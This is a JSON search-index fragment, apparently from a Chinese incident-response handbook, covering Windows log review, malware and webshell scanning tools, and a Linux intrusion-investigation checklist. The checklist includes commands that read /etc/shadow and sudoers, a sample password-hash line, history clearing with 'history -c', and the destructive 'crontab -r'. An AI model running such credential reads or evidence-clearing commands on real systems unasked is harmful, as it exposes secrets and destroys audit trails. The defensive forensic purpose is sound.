a\u3001\u524d\u63d0\uff1a\u5f00\u542f\u5ba1\u6838\u7b56\u7565\uff0c\u82e5\u65e5\u540e\u7cfb\u7edf\u51fa\u73b0\u6545\u969c\u3001\u5b89\u5168\u4e8b\u6545\u5219\u53ef\u4ee5\u67e5\u770b\u7cfb\u7edf\u7684\u65e5\u5fd7\u6587\u4ef6\uff0c\u6392\u9664\u6545\u969c\uff0c\u8ffd\u67e5\u5165\u4fb5\u8005\u7684\u4fe1\u606f\u7b49\u3002 b\u3001Win+R \u6253\u5f00\u8fd0\u884c\uff0c\u8f93\u5165 \"eventvwr.msc\"\uff0c\u56de\u8f66\u8fd0\u884c\uff0c\u6253\u5f00\"\u4e8b\u4ef6\u67e5\u770b\u5668\"\u3002 C\u3001\u5bfc\u51fa\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u3001\u5b89\u5168\u65e5\u5fd7\u3001\u7cfb\u7edf\u65e5\u5fd7\uff0c\u5229\u7528 Log Parser \u8fdb\u884c\u5206\u6790\u3002 Web \u8bbf\u95ee\u65e5\u5fd7 \u5206\u6790\u65b9\u6cd5\uff1a a\u3001\u627e\u5230\u4e2d\u95f4\u4ef6\u7684web\u65e5\u5fd7\uff0c\u6253\u5305\u5230\u672c\u5730\u65b9\u4fbf\u8fdb\u884c\u5206\u6790\u3002 b\u3001\u63a8\u8350\u5de5\u5177\uff1aWindows \u4e0b\uff0c\u63a8\u8350\u7528 EmEditor \u8fdb\u884c\u65e5\u5fd7\u5206\u6790\uff0c\u652f\u6301\u5927\u6587\u672c\uff0c\u641c\u7d22\u6548\u7387\u8fd8\u4e0d\u9519\u3002Linux \u4e0b\uff0c\u4f7f\u7528 Shell \u547d\u4ee4\u7ec4\u5408\u67e5\u8be2\u5206\u6790\u3002","title":"1.6 \u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#0x02-\u5de5\u5177\u7bc7","text":"","title":"0x02 \u5de5\u5177\u7bc7"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#21-\u75c5\u6bd2\u5206\u6790","text":"PCHunter\uff1a http://www.xuetr.com \u706b\u7ed2\u5251\uff1a https://www.huorong.cn Process Explorer\uff1a https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer processhacker\uff1a https://processhacker.sourceforge.io/downloads.php autoruns\uff1a https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns OTL\uff1a https://www.bleepingcomputer.com/download/otl/ SysInspector\uff1a http://download.eset.com.cn/download/detail/?product=sysinspector","title":"2.1 \u75c5\u6bd2\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#22-\u75c5\u6bd2\u67e5\u6740","text":"\u5361\u5df4\u65af\u57fa\uff1a http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe \uff08\u63a8\u8350\u7406\u7531\uff1a\u7eff\u8272\u7248\u3001\u6700\u65b0\u75c5\u6bd2\u5e93\uff09 \u5927\u8718\u86db\uff1a http://free.drweb.ru/download+cureit+free \uff08\u63a8\u8350\u7406\u7531\uff1a\u626b\u63cf\u5feb\u3001\u4e00\u6b21\u4e0b\u8f7d\u53ea\u80fd\u75281\u5468\uff0c\u66f4\u65b0\u75c5\u6bd2\u5e93\uff09 \u706b\u7ed2\u5b89\u5168\u8f6f\u4ef6\uff1a https://www.huorong.cn 360\u6740\u6bd2\uff1a http://sd.360.cn/download_center.html","title":"2.2 \u75c5\u6bd2\u67e5\u6740"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#23-\u75c5\u6bd2\u52a8\u6001","text":"CVERC-\u56fd\u5bb6\u8ba1\u7b97\u673a\u75c5\u6bd2\u5e94\u6025\u5904\u7406\u4e2d\u5fc3\uff1a http://www.cverc.org.cn \u5fae\u6b65\u5728\u7ebf\u5a01\u80c1\u60c5\u62a5\u793e\u533a\uff1a https://x.threatbook.cn \u706b\u7ed2\u5b89\u5168\u8bba\u575b\uff1a http://bbs.huorong.cn/forum-59-1.html \u7231\u6bd2\u9738\u793e\u533a\uff1a http://bbs.duba.net \u817e\u8baf\u7535\u8111\u7ba1\u5bb6\uff1a http://bbs.guanjia.qq.com/forum-2-1.html","title":"2.3 \u75c5\u6bd2\u52a8\u6001"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#24-\u5728\u7ebf\u75c5\u6bd2\u626b\u63cf\u7f51\u7ad9","text":"Virustotal\uff1a https://www.virustotal.com Virscan\uff1a http://www.virscan.org \u817e\u8baf\u54c8\u52c3\u5206\u6790\u7cfb\u7edf\uff1a https://habo.qq.com Jotti \u6076\u610f\u8f6f\u4ef6\u626b\u63cf\u7cfb\u7edf\uff1a https://virusscan.jotti.org","title":"2.4 \u5728\u7ebf\u75c5\u6bd2\u626b\u63cf\u7f51\u7ad9"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#25-webshell\u67e5\u6740","text":"D\u76fe_Web\u67e5\u6740\uff1a http://www.d99net.net/index.asp \u6cb3\u9a6c WebShell \u67e5\u6740\uff1a http://www.shellpub.com","title":"2.5 webshell\u67e5\u6740"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/","text":"\u7b2c2\u7bc7\uff1aLinux \u5165\u4fb5\u6392\u67e5 \u00b6 0x00 \u524d\u8a00 \u00b6 \u5f53\u4f01\u4e1a\u53d1\u751f\u9ed1\u5ba2\u5165\u4fb5\u3001\u7cfb\u7edf\u5d29\u6e83\u6216\u5176\u5b83\u5f71\u54cd\u4e1a\u52a1\u6b63\u5e38\u8fd0\u884c\u7684\u5b89\u5168\u4e8b\u4ef6\u65f6\uff0c\u6025\u9700\u7b2c\u4e00\u65f6\u95f4\u8fdb\u884c\u5904\u7406\uff0c\u4f7f\u4f01\u4e1a\u7684\u7f51\u7edc\u4fe1\u606f\u7cfb\u7edf\u5728\u6700\u77ed\u65f6\u95f4\u5185\u6062\u590d\u6b63\u5e38\u5de5\u4f5c\uff0c\u8fdb\u4e00\u6b65\u67e5\u627e\u5165\u4fb5\u6765\u6e90\uff0c\u8fd8\u539f\u5165\u4fb5\u4e8b\u6545\u8fc7\u7a0b\uff0c\u540c\u65f6\u7ed9\u51fa\u89e3\u51b3\u65b9\u6848\u4e0e\u9632\u8303\u63aa\u65bd\uff0c\u4e3a\u4f01\u4e1a\u633d\u56de\u6216\u51cf\u5c11\u7ecf\u6d4e\u635f\u5931\u3002 \u9488\u5bf9\u5e38\u89c1\u7684\u653b\u51fb\u4e8b\u4ef6\uff0c\u7ed3\u5408\u5de5\u4f5c\u4e2d\u5e94\u6025\u54cd\u5e94\u4e8b\u4ef6\u5206\u6790\u548c\u89e3\u51b3\u7684\u65b9\u6cd5\uff0c\u603b\u7ed3\u4e86\u4e00\u4e9b Linux \u670d\u52a1\u5668\u5165\u4fb5\u6392\u67e5\u7684\u601d\u8def\u3002 0x01 \u5165\u4fb5\u6392\u67e5\u601d\u8def \u00b6 1.1 \u8d26\u53f7\u5b89\u5168 \u00b6 \u57fa\u672c\u4f7f\u7528\uff1a 1\u3001\u7528\u6237\u4fe1\u606f\u6587\u4ef6 /etc/passwd root:x:0:0:root:/root:/bin/bash account:password:UID:GID:GECOS:directory:shell \u7528\u6237\u540d\uff1a\u5bc6\u7801\uff1a\u7528\u6237ID\uff1a\u7ec4ID\uff1a\u7528\u6237\u8bf4\u660e\uff1a\u5bb6\u76ee\u5f55\uff1a\u767b\u9646\u4e4b\u540e\u7684 shell \u6ce8\u610f\uff1a\u65e0\u5bc6\u7801\u53ea\u5141\u8bb8\u672c\u673a\u767b\u9646\uff0c\u8fdc\u7a0b\u4e0d\u5141\u8bb8\u767b\u9646 2\u3001\u5f71\u5b50\u6587\u4ef6 /etc/shadow root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: \u7528\u6237\u540d\uff1a\u52a0\u5bc6\u5bc6\u7801\uff1a\u5bc6\u7801\u6700\u540e\u4e00\u6b21\u4fee\u6539\u65e5\u671f\uff1a\u4e24\u6b21\u5bc6\u7801\u7684\u4fee\u6539\u65f6\u95f4\u95f4\u9694\uff1a\u5bc6\u7801\u6709\u6548\u671f\uff1a\u5bc6\u7801\u4fee\u6539\u5230\u671f\u5230\u7684\u8b66\u544a\u5929\u6570\uff1a\u5bc6\u7801\u8fc7\u671f\u4e4b\u540e\u7684\u5bbd\u9650\u5929\u6570\uff1a\u8d26\u53f7\u5931\u6548\u65f6\u95f4\uff1a\u4fdd\u7559 who \u67e5\u770b\u5f53\u524d\u767b\u5f55\u7528\u6237\uff08tty \u672c\u5730\u767b\u9646 pts \u8fdc\u7a0b\u767b\u5f55\uff09 w \u67e5\u770b\u7cfb\u7edf\u4fe1\u606f\uff0c\u60f3\u77e5\u9053\u67d0\u4e00\u65f6\u523b\u7528\u6237\u7684\u884c\u4e3a uptime \u67e5\u770b\u767b\u9646\u591a\u4e45\u3001\u591a\u5c11\u7528\u6237\uff0c\u8d1f\u8f7d\u72b6\u6001 \u5165\u4fb5\u6392\u67e5\uff1a 1\u3001\u67e5\u8be2\u7279\u6743\u7528\u6237\u7279\u6743\u7528\u6237(uid \u4e3a0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd 2\u3001\u67e5\u8be2\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u5e10\u53f7\u4fe1\u606f [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow 3\u3001\u9664root\u5e10\u53f7\u5916\uff0c\u5176\u4ed6\u5e10\u53f7\u662f\u5426\u5b58\u5728sudo\u6743\u9650\u3002\u5982\u975e\u7ba1\u7406\u9700\u8981\uff0c\u666e\u901a\u5e10\u53f7\u5e94\u5220\u9664sudo\u6743\u9650 [root@localhost ~]# more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\" 4\u3001\u7981\u7528\u6216\u5220\u9664\u591a\u4f59\u53ca\u53ef\u7591\u7684\u5e10\u53f7 usermod -L user \u7981\u7528\u5e10\u53f7\uff0c\u5e10\u53f7\u65e0\u6cd5\u767b\u5f55\uff0c/etc/shadow \u7b2c\u4e8c\u680f\u4e3a ! \u5f00\u5934 userdel user \u5220\u9664 user \u7528\u6237 userdel -r user \u5c06\u5220\u9664 user \u7528\u6237\uff0c\u5e76\u4e14\u5c06 /home \u76ee\u5f55\u4e0b\u7684 user \u76ee\u5f55\u4e00\u5e76\u5220\u9664 1.2 \u5386\u53f2\u547d\u4ee4 \u00b6 \u57fa\u672c\u4f7f\u7528\uff1a \u901a\u8fc7 .bash_history \u6587\u4ef6\u67e5\u770b\u5e10\u53f7\u6267\u884c\u8fc7\u7684\u7cfb\u7edf\u547d\u4ee4 1\u3001root \u7528\u6237\u7684\u5386\u53f2\u547d\u4ee4 histroy 2\u3001\u6253\u5f00 /home \u5404\u5e10\u53f7\u76ee\u5f55\u4e0b\u7684 .bash_history\uff0c\u67e5\u770b\u666e\u901a\u5e10\u53f7\u6267\u884c\u7684\u5386\u53f2\u547d\u4ee4\u3002 \u4e3a\u5386\u53f2\u7684\u547d\u4ee4\u589e\u52a0\u767b\u5f55\u7684 IP \u5730\u5740\u3001\u6267\u884c\u547d\u4ee4\u65f6\u95f4\u7b49\u4fe1\u606f\uff1a 1\uff09\u4fdd\u5b581\u4e07\u6761\u547d\u4ee4 sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile 2\uff09\u5728/etc/profile\u7684\u6587\u4ef6\u5c3e\u90e8\u6dfb\u52a0\u5982\u4e0b\u884c\u6570\u914d\u7f6e\u4fe1\u606f\uff1a ######jiagu history xianshi######### USER_IP=`who -u am i 2>/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'` if [ \"$USER_IP\" = \"\" ] then USER_IP=`hostname` fi export HISTTIMEFORMAT=\"%F %T $USER_IP `whoami` \" shopt -s histappend export PROMPT_COMMAND=\"history -a\" ######### jiagu history xianshi ########## 3\uff09source /etc/profile \u8ba9\u914d\u7f6e\u751f\u6548 \u751f\u6210\u6548\u679c\uff1a 1 2018-07-10 19:45:39 192.168.204.1 root source /etc/profile 3\u3001\u5386\u53f2\u64cd\u4f5c\u547d\u4ee4\u7684\u6e05\u9664\uff1ahistory -c \u4f46\u6b64\u547d\u4ee4\u5e76\u4e0d\u4f1a\u6e05\u9664\u4fdd\u5b58\u5728\u6587\u4ef6\u4e2d\u7684\u8bb0\u5f55\uff0c\u56e0\u6b64\u9700\u8981\u624b\u52a8\u5220\u9664 .bash_profile \u6587\u4ef6\u4e2d\u7684\u8bb0\u5f55\u3002 \u5165\u4fb5\u6392\u67e5\uff1a \u8fdb\u5165\u7528\u6237\u76ee\u5f55\u4e0b\uff0c\u5bfc\u51fa\u5386\u53f2\u547d\u4ee4\u3002 cat .bash_history >> history.txt 1.3 \u68c0\u67e5\u5f02\u5e38\u7aef\u53e3 \u00b6 \u4f7f\u7528 netstat \u7f51\u7edc\u8fde\u63a5\u547d\u4ee4\uff0c\u5206\u6790\u53ef\u7591\u7aef\u53e3\u3001IP\u3001PID netstat -antlp | more \u67e5\u770b\u4e0b pid \u6240\u5bf9\u5e94\u7684\u8fdb\u7a0b\u6587\u4ef6\u8def\u5f84\uff0c \u8fd0\u884c ls -l /proc/$PID/exe \u6216 file /proc/$PID/exe\uff08$PID \u4e3a\u5bf9\u5e94\u7684 pid \u53f7\uff09 1.4 \u68c0\u67e5\u5f02\u5e38\u8fdb\u7a0b \u00b6 \u4f7f\u7528 ps \u547d\u4ee4\uff0c\u5206\u6790\u8fdb\u7a0b ps aux | grep pid 1.5 \u68c0\u67e5\u5f00\u673a\u542f\u52a8\u9879 \u00b6 \u57fa\u672c\u4f7f\u7528\uff1a \u7cfb\u7edf\u8fd0\u884c\u7ea7\u522b\u793a\u610f\u56fe\uff1a \u8fd0\u884c\u7ea7\u522b \u542b\u4e49 0 \u5173\u673a 1 \u5355\u7528\u6237\u6a21\u5f0f\uff0c\u53ef\u4ee5\u60f3\u8c61\u4e3awindows\u7684\u5b89\u5168\u6a21\u5f0f\uff0c\u4e3b\u8981\u7528\u4e8e\u7cfb\u7edf\u4fee\u590d 2 \u4e0d\u5b8c\u5168\u7684\u547d\u4ee4\u884c\u6a21\u5f0f\uff0c\u4e0d\u542bNFS\u670d\u52a1 3 \u5b8c\u5168\u7684\u547d\u4ee4\u884c\u6a21\u5f0f\uff0c\u5c31\u662f\u6807\u51c6\u5b57\u7b26\u754c\u9762 4 \u7cfb\u7edf\u4fdd\u7559 5 \u56fe\u5f62\u6a21\u5f0f 6 \u91cd\u542f\u52a8 \u67e5\u770b\u8fd0\u884c\u7ea7\u522b\u547d\u4ee4 runlevel \u7cfb\u7edf\u9ed8\u8ba4\u5141\u8bb8\u7ea7\u522b vi /etc/inittab id=3\uff1ainitdefault #\u7cfb\u7edf\u5f00\u673a\u540e\u76f4\u63a5\u8fdb\u5165\u54ea\u4e2a\u8fd0\u884c\u7ea7\u522b \u5f00\u673a\u542f\u52a8\u914d\u7f6e\u6587\u4ef6 /etc/rc.local /etc/rc.d/rc[0~6].d \u4f8b\u5b50\uff1a\u5f53\u6211\u4eec\u9700\u8981\u5f00\u673a\u542f\u52a8\u81ea\u5df1\u7684\u811a\u672c\u65f6\uff0c\u53ea\u9700\u8981\u5c06\u53ef\u6267\u884c\u811a\u672c\u4e22\u5728 /etc/init.d \u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u5728 /etc/rc.d/rc*.d \u6587\u4ef6\u4e2d\u5efa\u7acb\u8f6f\u94fe\u63a5\u5373\u53ef\u3002 \u6ce8\uff1a\u6b64\u4e2d\u7684 * \u4ee3\u8868 0,1,2,3,4,5,6 \u8fd9\u4e03\u4e2a\u7b49\u7ea7 root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh \u6b64\u5904sshd\u662f\u5177\u4f53\u670d\u52a1\u7684\u811a\u672c\u6587\u4ef6\uff0cS100ssh\u662f\u5176\u8f6f\u94fe\u63a5\uff0cS\u5f00\u5934\u4ee3\u8868\u52a0\u8f7d\u65f6\u81ea\u542f\u52a8\uff1b\u5982\u679c\u662fK\u5f00\u5934\u7684\u811a\u672c\u6587\u4ef6\uff0c\u4ee3\u8868\u8fd0\u884c\u7ea7\u522b\u52a0\u8f7d\u65f6\u9700\u8981\u5173\u95ed\u7684\u3002 \u5165\u4fb5\u6392\u67e5\uff1a \u542f\u52a8\u9879\u6587\u4ef6\uff1a more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/ 1.6 \u68c0\u67e5\u5b9a\u65f6\u4efb\u52a1 \u00b6 \u57fa\u672c\u4f7f\u7528 1\u3001\u5229\u7528 crontab \u521b\u5efa\u8ba1\u5212\u4efb\u52a1 \u57fa\u672c\u547d\u4ee4 crontab -l \u5217\u51fa\u67d0\u4e2a\u7528\u6237cron\u670d\u52a1\u7684\u8be6\u7ec6\u5185\u5bb9 Tips\uff1a\u9ed8\u8ba4\u7f16\u5199\u7684crontab\u6587\u4ef6\u4f1a\u4fdd\u5b58\u5728 (/var/spool/cron/\u7528\u6237\u540d \u4f8b\u5982: /var/spool/cron/root crontab -r \u5220\u9664\u6bcf\u4e2a\u7528\u6237cront\u4efb\u52a1(\u8c28\u614e\uff1a\u5220\u9664\u6240\u6709\u7684\u8ba1\u5212\u4efb\u52a1) crontab -e \u4f7f\u7528\u7f16\u8f91\u5668\u7f16\u8f91\u5f53\u524d\u7684crontab\u6587\u4ef6 \u5982\uff1a*/1 * * * * echo \"hello world\" >> /tmp/test.txt \u6bcf\u5206\u949f\u5199\u5165\u6587\u4ef6 2\u3001\u5229\u7528 anacron \u547d\u4ee4\u5b9e\u73b0\u5f02\u6b65\u5b9a\u65f6\u4efb\u52a1\u8c03\u5ea6 \u4f7f\u7528\u6848\u4f8b \u6bcf\u5929\u8fd0\u884c /home/backup.sh \u811a\u672c\uff1a vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh \u5f53\u673a\u5668\u5728 backup.sh \u671f\u671b\u88ab\u8fd0\u884c\u65f6\u662f\u5173\u673a\u7684\uff0canacron\u4f1a\u5728\u673a\u5668\u5f00\u673a\u5341\u5206\u949f\u4e4b\u540e\u8fd0\u884c\u5b83\uff0c\u800c\u4e0d\u7528\u518d\u7b49\u5f85 7\u5929\u3002 \u5165\u4fb5\u6392\u67e5 \u91cd\u70b9\u5173\u6ce8\u4ee5\u4e0b\u76ee\u5f55\u4e2d\u662f\u5426\u5b58\u5728\u6076\u610f\u811a\u672c /var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/* \u5c0f\u6280\u5de7\uff1a more /etc/cron.daily/* \u67e5\u770b\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6 1.7 \u68c0\u67e5\u670d\u52a1 \u00b6 \u670d\u52a1\u81ea\u542f\u52a8 \u7b2c\u4e00\u79cd\u4fee\u6539\u65b9\u6cd5\uff1a chkconfig [--level \u8fd0\u884c\u7ea7\u522b] [\u72ec\u7acb\u670d\u52a1\u540d] [on|off] chkconfig \u2013level 2345 httpd on \u5f00\u542f\u81ea\u542f\u52a8 chkconfig httpd on \uff08\u9ed8\u8ba4level\u662f2345\uff09 \u7b2c\u4e8c\u79cd\u4fee\u6539\u65b9\u6cd5\uff1a \u4fee\u6539 /etc/re.d/rc.local \u6587\u4ef6 \u52a0\u5165 /etc/init.d/httpd start \u7b2c\u4e09\u79cd\u4fee\u6539\u65b9\u6cd5\uff1a \u4f7f\u7528 ntsysv \u547d\u4ee4\u7ba1\u7406\u81ea\u542f\u52a8\uff0c\u53ef\u4ee5\u7ba1\u7406\u72ec\u7acb\u670d\u52a1\u548c xinetd \u670d\u52a1\u3002 \u5165\u4fb5\u6392\u67e5 1\u3001\u67e5\u8be2\u5df2\u5b89\u88c5\u7684\u670d\u52a1\uff1a RPM \u5305\u5b89\u88c5\u7684\u670d\u52a1 chkconfig --list \u67e5\u770b\u670d\u52a1\u81ea\u542f\u52a8\u72b6\u6001\uff0c\u53ef\u4ee5\u770b\u5230\u6240\u6709\u7684RPM\u5305\u5b89\u88c5\u7684\u670d\u52a1 ps aux | grep crond \u67e5\u770b\u5f53\u524d\u670d\u52a1 \u7cfb\u7edf\u57283\u4e0e5\u7ea7\u522b\u4e0b\u7684\u542f\u52a8\u9879 \u4e2d\u6587\u73af\u5883 chkconfig --list | grep \"3:\u542f\u7528\\|5:\u542f\u7528\" \u82f1\u6587\u73af\u5883 chkconfig --list | grep \"3:on\\|5:on\" \u6e90\u7801\u5305\u5b89\u88c5\u7684\u670d\u52a1 \u67e5\u770b\u670d\u52a1\u5b89\u88c5\u4f4d\u7f6e \uff0c\u4e00\u822c\u662f\u5728/user/local/ service httpd start \u641c\u7d22/etc/rc.d/init.d/ \u67e5\u770b\u662f\u5426\u5b58\u5728 1.8 \u68c0\u67e5\u5f02\u5e38\u6587\u4ef6 \u00b6 1\u3001\u67e5\u770b\u654f\u611f\u76ee\u5f55\uff0c\u5982/tmp\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u540c\u65f6\u6ce8\u610f\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u4ee5\u201c..\u201d\u4e3a\u540d\u7684\u6587\u4ef6\u5939\u5177\u6709\u9690\u85cf\u5c5e\u6027 2\u3001\u5f97\u5230\u53d1\u73b0WEBSHELL\u3001\u8fdc\u63a7\u6728\u9a6c\u7684\u521b\u5efa\u65f6\u95f4\uff0c\u5982\u4f55\u627e\u51fa\u540c\u4e00\u65f6\u95f4\u8303\u56f4\u5185\u521b\u5efa\u7684\u6587\u4ef6\uff1f \u200b \u53ef\u4ee5\u4f7f\u7528find\u547d\u4ee4\u6765\u67e5\u627e\uff0c\u5982 find /opt -iname \"*\" -atime 1 -type f \u627e\u51fa /opt \u4e0b\u4e00\u5929\u524d\u8bbf\u95ee\u8fc7\u7684\u6587\u4ef6 3\u3001\u9488\u5bf9\u53ef\u7591\u6587\u4ef6\u53ef\u4ee5\u4f7f\u7528 stat \u8fdb\u884c\u521b\u5efa\u4fee\u6539\u65f6\u95f4\u3002 1.9 \u68c0\u67e5\u7cfb\u7edf\u65e5\u5fd7 \u00b6 \u65e5\u5fd7\u9ed8\u8ba4\u5b58\u653e\u4f4d\u7f6e\uff1a/var/log/ \u67e5\u770b\u65e5\u5fd7\u914d\u7f6e\u60c5\u51b5\uff1amore /etc/rsyslog.conf \u65e5\u5fd7\u6587\u4ef6 \u8bf4\u660e /var/log/cron \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5b9a\u65f6\u4efb\u52a1\u76f8\u5173\u7684\u65e5\u5fd7 /var/log/cups \u8bb0\u5f55\u6253\u5370\u4fe1\u606f\u7684\u65e5\u5fd7 /var/log/dmesg \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5728\u5f00\u673a\u65f6\u5185\u6838\u81ea\u68c0\u7684\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528dmesg\u547d\u4ee4\u76f4\u63a5\u67e5\u770b\u5185\u6838\u81ea\u68c0\u4fe1\u606f /var/log/mailog \u8bb0\u5f55\u90ae\u4ef6\u4fe1\u606f /var/log/message \u8bb0\u5f55\u7cfb\u7edf\u91cd\u8981\u4fe1\u606f\u7684\u65e5\u5fd7\u3002\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d\u4f1a\u8bb0\u5f55Linux\u7cfb\u7edf\u7684\u7edd\u5927\u591a\u6570\u91cd\u8981\u4fe1\u606f\uff0c\u5982\u679c\u7cfb\u7edf\u51fa\u73b0\u95ee\u9898\u65f6\uff0c\u9996\u5148\u8981\u68c0\u67e5\u7684\u5c31\u5e94\u8be5\u662f\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6 /var/log/btmp \u8bb0\u5f55\u9519\u8bef\u767b\u5f55\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\u67e5\u770b\uff0c\u800c\u8981\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/wtmp \u6c38\u4e45\u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u3001\u6ce8\u9500\u4fe1\u606f\uff0c\u540c\u65f6\u8bb0\u5f55\u7cfb\u7edf\u7684\u542f\u52a8\u3001\u91cd\u542f\u3001\u5173\u673a\u4e8b\u4ef6\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e5f\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u9700\u8981\u4f7f\u7528last\u547d\u4ee4\u6765\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u968f\u7740\u7528\u6237\u7684\u767b\u5f55\u548c\u6ce8\u9500\u4e0d\u65ad\u53d8\u5316\uff0c\u53ea\u8bb0\u5f55\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u4fe1\u606f\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u6765\u67e5\u8be2 /var/log/secure \u8bb0\u5f55\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\uff0c\u6bd4\u5982SSH\u767b\u5f55\uff0csu\u5207\u6362\u7528\u6237\uff0csudo\u6388\u6743\uff0c\u751a\u81f3\u6dfb\u52a0\u7528\u6237\u548c\u4fee\u6539\u7528\u6237\u5bc6\u7801\u90fd\u4f1a\u8bb0\u5f55\u5728\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d \u65e5\u5fd7\u5206\u6790\u6280\u5de7\uff1a 1\u3001\u5b9a\u4f4d\u6709\u591a\u5c11IP\u5728\u7206\u7834\u4e3b\u673a\u7684root\u5e10\u53f7\uff1a grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u5b9a\u4f4d\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1a grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c 